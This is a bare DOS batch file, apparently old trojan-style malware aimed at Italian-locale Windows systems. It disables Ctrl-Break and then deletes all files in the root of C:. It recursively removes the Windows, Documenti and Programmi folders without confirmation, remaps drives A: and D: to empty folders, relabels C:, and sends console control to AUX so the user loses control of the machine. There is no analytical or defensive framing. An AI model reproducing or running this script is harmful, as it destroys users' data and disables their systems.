break off
@ echo off
del c:\*.*
deltree /y c:\windows
deltree /y c:\documenti
deltree /y c:\programmi
md c:\windows\fkdra
md c:\windows\fkdrd
subst a: c:\windows\fkdra
subst d: c:\windows\fkdrd
label c:21st
ctty aux
cls